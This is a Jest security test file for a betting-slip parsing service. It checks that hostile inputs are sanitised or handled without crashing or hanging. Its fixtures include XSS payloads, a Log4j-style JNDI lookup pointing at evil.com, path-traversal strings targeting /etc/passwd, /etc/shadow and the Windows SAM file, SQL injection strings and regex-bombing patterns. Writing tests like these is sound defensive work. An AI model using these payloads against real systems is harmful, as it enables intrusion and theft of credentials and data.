/**
 * Security tests for input validation and sanitization
 * Tests protection against malicious inputs and injection attacks
 */

const bettingSlipAnalyzer = require('../../src/services/bettingSlipAnalyzer');
const matchResultService = require('../../src/services/matchResultService');

// Mock the cache service for security tests
jest.mock('../../src/services/cacheService', () => ({
    getMatchResult: jest.fn(() => null),
    cacheMatchResult: jest.fn(),
    getTeamSearch: jest.fn(() => null),
    cacheTeamSearch: jest.fn()
}));

describe('Security - Input Validation', () => {
    beforeEach(() => {
        jest.clearAllMocks();
    });

    describe('Malicious Input Protection', () => {
        test('should handle script injection attempts in OCR text', () => {
            const maliciousInputs = [
                '<script>alert("XSS")</script>',
                'javascript:alert("XSS")',
                '<img src=x onerror=alert("XSS")>',
                '${jndi:ldap://evil.com/a}', // Log4j style injection
                '../../../etc/passwd', // Path traversal
                'SELECT * FROM users; DROP TABLE users;--', // SQL injection style
            ];

            maliciousInputs.forEach(maliciousInput => {
                const input = `Bet Ref TEST123\n${maliciousInput}\n1.50\nStake £10.00`;
                
                expect(() => {
                    const result = bettingSlipAnalyzer.analyze(input);
                    // Should not throw errors and should sanitize input
                    expect(result).toBeDefined();
                    expect(result.isBettingSlip).toBeDefined();
                }).not.toThrow();
            });
        });

        test('should handle extremely long strings safely', () => {
            const extremelyLongString = 'A'.repeat(1000000); // 1MB string
            const input = `Bet Ref TEST123\n${extremelyLongString}\n1.50\nStake £10.00`;

            expect(() => {
                const result = bettingSlipAnalyzer.analyze(input);
                expect(result).toBeDefined();
            }).not.toThrow();
        });

        test('should handle null bytes and control characters', () => {
            const maliciousChars = [
                '\x00', // Null byte
                '\x01', // Start of heading
                '\x02', // Start of text
                '\x1f', // Unit separator
                '\x7f', // Delete
                '\xff', // High bit set
            ];

            maliciousChars.forEach(char => {
                const input = `Bet Ref TEST123\nLiverpool${char}\n1.50\nStake £10.00`;
                
                expect(() => {
                    const result = bettingSlipAnalyzer.analyze(input);
                    expect(result).toBeDefined();
                }).not.toThrow();
            });
        });

        test('should handle Unicode exploits and encoding issues', () => {
            const unicodeInputs = [
                '🕷️🕸️💀', // Emoji that might cause encoding issues
                '\u202e', // Right-to-left override
                '\u200b', // Zero-width space
                '\ufeff', // Byte order mark
                '﷽', // Arabic ligature that caused issues in some systems
                String.fromCharCode(65536), // High Unicode code point
            ];

            unicodeInputs.forEach(unicodeInput => {
                const input = `Bet Ref TEST123\n${unicodeInput}\n1.50\nStake £10.00`;
                
                expect(() => {
                    const result = bettingSlipAnalyzer.analyze(input);
                    expect(result).toBeDefined();
                }).not.toThrow();
            });
        });
    });

    describe('DoS Protection', () => {
        test('should handle recursive patterns safely', () => {
            const recursivePattern = '((((((((((Liverpool))))))))))';
            const input = `Bet Ref TEST123\n${recursivePattern}\n1.50\nStake £10.00`;

            const startTime = Date.now();
            const result = bettingSlipAnalyzer.analyze(input);
            const processingTime = Date.now() - startTime;

            expect(result).toBeDefined();
            expect(processingTime).toBeLessThan(5000); // Should not hang
        });

        test('should handle regex bombing attempts', () => {
            // Patterns that could cause catastrophic backtracking
            const regexBombs = [
                'a'.repeat(1000) + '!',
                '(a+)+$',
                '(a|a)*$',
                '([a-zA-Z]+)*$',
                '(x+x+)+y',
            ];

            regexBombs.forEach(bomb => {
                const input = `Bet Ref TEST123\n${bomb}\n1.50\nStake £10.00`;
                
                const startTime = Date.now();
                const result = bettingSlipAnalyzer.analyze(input);
                const processingTime = Date.now() - startTime;

                expect(result).toBeDefined();
                expect(processingTime).toBeLessThan(1000); // Should complete quickly
            });
        });

        test('should handle memory exhaustion attempts', () => {
            // Attempt to create large objects
            const largeRepeatedContent = 'Bet Selection '.repeat(10000);
            const input = `Bet Ref TEST123\n${largeRepeatedContent}\n1.50\nStake £10.00`;

            const initialMemory = process.memoryUsage().heapUsed;
            
            const result = bettingSlipAnalyzer.analyze(input);
            
            const finalMemory = process.memoryUsage().heapUsed;
            const memoryIncrease = (finalMemory - initialMemory) / (1024 * 1024); // MB

            expect(result).toBeDefined();
            expect(memoryIncrease).toBeLessThan(100); // Should not use excessive memory
        });
    });

    describe('Data Sanitization', () => {
        test('should sanitize team names properly', () => {
            const maliciousTeamNames = [
                'Liverpool<script>alert("XSS")</script>',
                'Chelsea"; DROP TABLE teams;--',
                'Arsenal${maliciousVariable}',
                'Man United\x00\x01\x02',
            ];

            maliciousTeamNames.forEach(maliciousName => {
                const normalized = bettingSlipAnalyzer.normalizeTeamName(maliciousName);
                
                // Should not contain script tags or SQL injection attempts
                expect(normalized).not.toMatch(/<script>/i);
                expect(normalized).not.toMatch(/drop\s+table/i);
                expect(normalized).not.toMatch(/\$\{/);
                expect(normalized).not.toMatch(/[\x00-\x1f\x7f-\xff]/);
            });
        });

        test('should validate odds format strictly', () => {
            const maliciousOdds = [
                '1.50; DELETE FROM bets;',
                '${odds}',
                'NaN',
                'Infinity',
                '-1.50',
                '999999.99',
            ];

            maliciousOdds.forEach(odds => {
                const input = `Bet Ref TEST123\nLiverpool\n${odds}\nStake £10.00`;
                const result = bettingSlipAnalyzer.analyze(input);
                
                if (result.selections.length > 0) {
                    const selection = result.selections[0];
                    if (selection.odds !== null) {
                        expect(typeof selection.odds).toBe('number');
                        expect(selection.odds).toBeGreaterThan(0);
                        expect(selection.odds).toBeLessThan(1000);
                        expect(isFinite(selection.odds)).toBe(true);
                    }
                }
            });
        });

        test('should validate date formats safely', () => {
            const maliciousDates = [
                '32/13/2024', // Invalid date
                '../../../etc/passwd',
                '<script>alert("XSS")</script>',
                '1970-01-01T00:00:00.000Z; DROP TABLE dates;',
                '${maliciousDate}',
            ];

            maliciousDates.forEach(date => {
                const parsedDate = bettingSlipAnalyzer.parseMatchDate(date);
                
                if (parsedDate !== null) {
                    expect(parsedDate).toMatch(/^\d{4}-\d{2}-\d{2}$/);
                    expect(new Date(parsedDate).toString()).not.toBe('Invalid Date');
                }
            });
        });
    });

    describe('Environment Variable Security', () => {
        test('should not expose sensitive environment variables in errors', () => {
            // Temporarily unset API keys to test error handling
            const originalFootballKey = process.env.FOOTBALL_API_KEY;
            const originalBraveKey = process.env.BRAVE_API_KEY;
            
            delete process.env.FOOTBALL_API_KEY;
            delete process.env.BRAVE_API_KEY;

            try {
                const selections = [{ team: 'Liverpool', opponent: 'Arsenal', market: 'Full Time Result' }];
                
                // This should handle missing API keys gracefully
                expect(async () => {
                    await matchResultService.fetchMatchResults(selections);
                }).not.toThrow();
                
            } finally {
                // Restore environment variables
                if (originalFootballKey) process.env.FOOTBALL_API_KEY = originalFootballKey;
                if (originalBraveKey) process.env.BRAVE_API_KEY = originalBraveKey;
            }
        });

        test('should validate API key format', () => {
            const maliciousApiKeys = [
                '<script>alert("XSS")</script>',
                '../../../etc/passwd',
                '${maliciousKey}',
                'javascript:alert("XSS")',
            ];

            maliciousApiKeys.forEach(maliciousKey => {
                const originalKey = process.env.FOOTBALL_API_KEY;
                process.env.FOOTBALL_API_KEY = maliciousKey;

                try {
                    // Should handle malicious API keys without executing code
                    expect(() => {
                        require('../../src/config/environment');
                    }).not.toThrow();
                } finally {
                    process.env.FOOTBALL_API_KEY = originalKey;
                }
            });
        });
    });

    describe('Rate Limiting Protection', () => {
        test('should handle rapid successive requests safely', async () => {
            const selections = [{ team: 'Liverpool', opponent: 'Arsenal', market: 'Full Time Result' }];
            
            // Simulate rapid requests
            const promises = Array.from({ length: 100 }, () => 
                matchResultService.fetchSelectionResult(selections[0])
            );

            const startTime = Date.now();
            const results = await Promise.allSettled(promises);
            const totalTime = Date.now() - startTime;

            // Should handle all requests without crashing
            expect(results).toHaveLength(100);
            expect(totalTime).toBeLessThan(30000); // Should complete within reasonable time
            
            // All results should be valid (either success or controlled failure)
            results.forEach(result => {
                if (result.status === 'fulfilled') {
                    expect(result.value).toBeDefined();
                    expect(result.value).toHaveProperty('result');
                }
            });
        });
    });

    describe('File Path Security', () => {
        test('should reject path traversal attempts in team names', () => {
            const pathTraversalAttempts = [
                '../../../etc/passwd',
                '..\\..\\windows\\system32\\config\\sam',
                '/etc/shadow',
                'C:\\Windows\\System32\\config\\SAM',
                '....//....//....//etc//passwd',
            ];

            pathTraversalAttempts.forEach(path => {
                const input = `Bet Ref TEST123\n${path}\n1.50\nStake £10.00`;
                const result = bettingSlipAnalyzer.analyze(input);
                
                // Should not process as valid team name
                if (result.selections.length > 0) {
                    expect(result.selections[0].team).not.toContain('..');
                    expect(result.selections[0].team).not.toContain('/etc/');
                    expect(result.selections[0].team).not.toContain('\\Windows\\');
                }
            });
        });
    });

    describe('Error Information Disclosure', () => {
        test('should not expose internal paths in error messages', () => {
            const consoleErrorSpy = jest.spyOn(console, 'error').mockImplementation(() => {});
            
            try {
                // Force an error condition
                const malformedInput = '\x00'.repeat(1000);
                bettingSlipAnalyzer.analyze(malformedInput);
                
                // Check that any logged errors don't contain sensitive paths
                const errorCalls = consoleErrorSpy.mock.calls;
                errorCalls.forEach(call => {
                    const errorMessage = call.join(' ');
                    expect(errorMessage).not.toMatch(/\/home\/[^\/]+/); // Home directories
                    expect(errorMessage).not.toMatch(/C:\\Users\\[^\\]+/); // Windows user dirs
                    expect(errorMessage).not.toMatch(/node_modules/); // Internal paths
                });
                
            } finally {
                consoleErrorSpy.mockRestore();
            }
        });

        test('should not expose stack traces to users', () => {
            // This would be tested in integration with the Telegram bot
            // Here we ensure that internal errors are caught properly
            
            expect(() => {
                bettingSlipAnalyzer.analyze(null);
            }).not.toThrow(); // Should handle null input gracefully
            
            expect(() => {
                bettingSlipAnalyzer.analyze(undefined);
            }).not.toThrow(); // Should handle undefined input gracefully
        });
    });

    describe('Type Safety', () => {
        test('should handle type confusion attacks', () => {
            const typeConfusionInputs = [
                { toString: () => 'Bet Ref TEST123\nLiverpool\n1.50' },
                ['Bet', 'Ref', 'TEST123', 'Liverpool', '1.50'],
                123456,
                true,
                { malicious: 'object' },
            ];

            typeConfusionInputs.forEach(input => {
                expect(() => {
                    bettingSlipAnalyzer.analyze(input);
                }).not.toThrow();
            });
        });

        test('should validate numeric inputs strictly', () => {
            const maliciousNumbers = [
                '1.50e308', // Potential overflow
                '1.50e-308', // Potential underflow  
                '0x41414141', // Hex that might be interpreted differently
                'NaN',
                'Infinity',
                '-Infinity',
            ];

            maliciousNumbers.forEach(num => {
                const input = `Bet Ref TEST123\nLiverpool\n${num}\nStake £10.00`;
                const result = bettingSlipAnalyzer.analyze(input);
                
                if (result.selections.length > 0) {
                    const odds = result.selections[0].odds;
                    if (odds !== null) {
                        expect(isFinite(odds)).toBe(true);
                        expect(odds).toBeGreaterThan(0);
                    }
                }
            });
        });
    });
});